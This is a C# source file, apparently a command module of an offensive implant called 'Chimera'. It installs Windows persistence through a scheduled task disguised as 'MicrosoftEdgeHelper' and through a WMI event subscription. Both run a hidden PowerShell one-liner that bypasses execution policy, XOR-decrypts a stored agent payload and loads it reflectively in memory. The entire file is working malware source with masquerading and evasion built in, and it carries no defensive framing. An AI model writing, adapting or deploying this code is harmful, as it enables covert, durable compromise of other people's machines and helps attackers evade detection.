using System;
using System.Diagnostics;
using System.Management;
using Microsoft.Win32;

namespace Chimera.Commands
{
    // persist2 install        — scheduled task on user logon
    // persist2 installwmi     — WMI __EventFilter + CommandLineEventConsumer on startup
    // persist2 remove         — removes both
    //
    // Both methods execute the same PS one-liner that decrypts agent.dat in memory.
    // Requires agent.dat to already exist (run 'persist' first).
    public static class Persist2
    {
        private const string TaskName     = "MicrosoftEdgeHelper";
        private const string WmiFilterName    = "ChimeraStartupFilter";
        private const string WmiConsumerName  = "ChimeraStartupConsumer";
        private const string WmiBindingName   = "ChimeraStartupBinding";

        // The PS one-liner (XOR key 0x41) — matches Persist.cs exactly
        private static readonly string BlobPath =
            System.IO.Path.Combine(Staging.Dir, "agent.dat");

        private static string Loader()
        {
            return
                "\"$k=0x41;" +
                "$d=[IO.File]::ReadAllBytes('" + BlobPath + "');" +
                "$o=New-Object byte[] $d.Length;" +
                "for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i]-bxor$k};" +
                "[Reflection.Assembly]::Load($o).EntryPoint.Invoke($null,@())\"";
        }

        // ----------------------------------------------------------------
        // Scheduled task — ONLOGON trigger, runs as current user
        // ----------------------------------------------------------------
        public static string InstallTask()
        {
            if (!System.IO.File.Exists(BlobPath))
                return "[error] " + BlobPath + " not found. Run 'persist' first.";

            var sb = new System.Text.StringBuilder();
            try
            {
                // Remove stale entry silently first
                RunCmd("schtasks /delete /tn \"" + TaskName + "\" /f");

                string cmd =
                    "schtasks /create" +
                    " /tn \"" + TaskName + "\"" +
                    " /sc ONLOGON" +
                    " /tr \"powershell.exe -ep bypass -WindowStyle Hidden -c " + Loader() + "\"" +
                    " /rl HIGHEST" +
                    " /f";

                string out1 = RunCmd(cmd);
                if (out1.IndexOf("SUCCESS", StringComparison.OrdinalIgnoreCase) >= 0 ||
                    out1.IndexOf("created", StringComparison.OrdinalIgnoreCase) >= 0)
                    sb.AppendLine("[+] Scheduled task '" + TaskName + "' created (ONLOGON).");
                else
                    sb.AppendLine("[-] schtasks: " + out1.Trim());
            }
            catch (Exception ex)
            {
                sb.AppendLine("[error] Task: " + ex.Message);
            }
            return sb.ToString();
        }

        // ----------------------------------------------------------------
        // WMI persistence — fires on startup (__InstanceCreationEvent / Win32_ComputerSystem)
        // ----------------------------------------------------------------
        public static string InstallWmi()
        {
            if (!System.IO.File.Exists(BlobPath))
                return "[error] " + BlobPath + " not found. Run 'persist' first.";

            var sb = new System.Text.StringBuilder();
            try
            {
                string ns = @"root\subscription";

                // Clean up any existing objects with same names
                RemoveWmiObjects(ns);

                // __EventFilter — triggers 60 s after system startup
                using (ManagementClass filterClass =
                    new ManagementClass(new ManagementScope(ns),
                        new ManagementPath("__EventFilter"),
                        new ObjectGetOptions()))
                {
                    ManagementObject filter = filterClass.CreateInstance();
                    filter["Name"]          = WmiFilterName;
                    filter["EventNameSpace"]= "root\\cimv2";
                    filter["QueryLanguage"] = "WQL";
                    filter["Query"]         =
                        "SELECT * FROM __InstanceCreationEvent WITHIN 60 " +
                        "WHERE TargetInstance ISA 'Win32_Process' " +
                        "AND TargetInstance.Name = 'explorer.exe'";
                    filter.Put();
                    sb.AppendLine("[+] WMI __EventFilter '" + WmiFilterName + "' created.");
                }

                // CommandLineEventConsumer — runs the PS loader
                string psCmd =
                    "powershell.exe -ep bypass -WindowStyle Hidden -c " + Loader();

                using (ManagementClass consClass =
                    new ManagementClass(new ManagementScope(ns),
                        new ManagementPath("CommandLineEventConsumer"),
                        new ObjectGetOptions()))
                {
                    ManagementObject consumer = consClass.CreateInstance();
                    consumer["Name"]              = WmiConsumerName;
                    consumer["CommandLineTemplate"] = psCmd;
                    consumer["RunInteractively"]  = false;
                    consumer.Put();
                    sb.AppendLine("[+] CommandLineEventConsumer '" + WmiConsumerName + "' created.");
                }

                // __FilterToConsumerBinding
                using (ManagementClass bindingClass =
                    new ManagementClass(new ManagementScope(ns),
                        new ManagementPath("__FilterToConsumerBinding"),
                        new ObjectGetOptions()))
                {
                    ManagementObject binding = bindingClass.CreateInstance();
                    binding["Filter"]   =
                        @"\\.\root\subscription:__EventFilter.Name=""" + WmiFilterName + @"""";
                    binding["Consumer"] =
                        @"\\.\root\subscription:CommandLineEventConsumer.Name=""" + WmiConsumerName + @"""";
                    binding.Put();
                    sb.AppendLine("[+] __FilterToConsumerBinding created.");
                }

                sb.AppendLine("[+] WMI persistence installed. Fires when explorer.exe starts.");
            }
            catch (Exception ex)
            {
                sb.AppendLine("[error] WMI: " + ex.Message);
                sb.AppendLine("[note] WMI persistence requires SYSTEM or admin rights.");
            }
            return sb.ToString();
        }

        // ----------------------------------------------------------------
        // Remove everything
        // ----------------------------------------------------------------
        public static string Remove()
        {
            var sb = new System.Text.StringBuilder();

            // Scheduled task
            try
            {
                string out1 = RunCmd("schtasks /delete /tn \"" + TaskName + "\" /f");
                if (out1.IndexOf("SUCCESS", StringComparison.OrdinalIgnoreCase) >= 0 ||
                    out1.IndexOf("deleted", StringComparison.OrdinalIgnoreCase) >= 0 ||
                    out1.IndexOf("ERROR: The system cannot find", StringComparison.OrdinalIgnoreCase) < 0)
                    sb.AppendLine("[+] Scheduled task '" + TaskName + "' removed.");
                else
                    sb.AppendLine("[*] Scheduled task not found or already removed.");
            }
            catch (Exception ex) { sb.AppendLine("[-] Task removal: " + ex.Message); }

            // WMI objects
            try
            {
                RemoveWmiObjects(@"root\subscription");
                sb.AppendLine("[+] WMI persistence objects removed.");
            }
            catch (Exception ex) { sb.AppendLine("[-] WMI removal: " + ex.Message); }

            return sb.ToString();
        }

        // ----------------------------------------------------------------
        // Helpers
        // ----------------------------------------------------------------
        public static string Execute(string param)
        {
            if (string.IsNullOrEmpty(param))
                return "[usage] persist2 install | installwmi | remove";

            switch (param.Trim().ToLower())
            {
                case "install":    return InstallTask();
                case "installwmi": return InstallWmi();
                case "remove":     return Remove();
                default:
                    return "[usage] persist2 install | installwmi | remove";
            }
        }

        private static void RemoveWmiObjects(string ns)
        {
            string[] classes = new[]
            {
                "__FilterToConsumerBinding",
                "CommandLineEventConsumer",
                "__EventFilter"
            };
            string[] names = new[]
            {
                null, // binding has no single Name key — delete by filter+consumer
                WmiConsumerName,
                WmiFilterName
            };

            // Delete binding first (it references the other two)
            try
            {
                using (ManagementObjectSearcher s = new ManagementObjectSearcher(
                    new ManagementScope(ns),
                    new ObjectQuery(
                        "SELECT * FROM __FilterToConsumerBinding WHERE " +
                        "Filter = '\\\\.\\\\" + ns.Replace("\\","\\\\") +
                        ":__EventFilter.Name=\"" + WmiFilterName + "\"'")))
                {
                    foreach (ManagementObject obj in s.Get())
                        obj.Delete();
                }
            }
            catch { }

            // Delete consumer and filter by Name
            foreach (string cls in new[]{"CommandLineEventConsumer","__EventFilter"})
            {
                string name = cls == "CommandLineEventConsumer"
                    ? WmiConsumerName : WmiFilterName;
                try
                {
                    using (ManagementObject obj = new ManagementObject(
                        new ManagementScope(ns),
                        new ManagementPath(cls + ".Name=\"" + name + "\""),
                        null))
                    {
                        obj.Delete();
                    }
                }
                catch { }
            }
        }

        private static string RunCmd(string cmd)
        {
            var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
            {
                UseShellExecute        = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true
            };
            using (Process p = Process.Start(psi))
            {
                string o = p.StandardOutput.ReadToEnd();
                string e = p.StandardError.ReadToEnd();
                p.WaitForExit(10000);
                return o + e;
            }
        }
    }
}
